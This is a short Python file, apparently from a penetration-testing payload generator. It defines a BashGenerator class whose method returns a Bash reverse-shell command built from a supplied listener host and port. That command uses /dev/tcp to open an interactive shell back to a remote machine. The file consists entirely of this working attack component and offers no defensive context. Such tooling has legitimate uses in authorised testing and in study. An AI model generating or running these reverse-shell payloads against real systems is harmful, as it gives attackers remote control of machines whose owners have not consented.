#!/usr/bin/env python3

class BashGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    
    def generate_reverse_shell(self):
        """Generate Bash reverse shell"""
        return f'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'